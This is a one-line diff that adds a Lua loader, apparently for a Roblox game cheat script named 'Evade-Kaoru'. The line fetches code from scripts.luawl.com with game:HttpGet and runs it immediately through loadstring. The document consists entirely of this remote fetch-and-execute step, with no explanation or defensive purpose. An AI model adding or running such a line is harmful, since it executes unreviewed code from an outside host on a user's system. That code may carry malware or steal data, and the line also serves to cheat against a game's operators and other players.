@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.luawl.com/12655/Evade-Kaoru.lua'))()
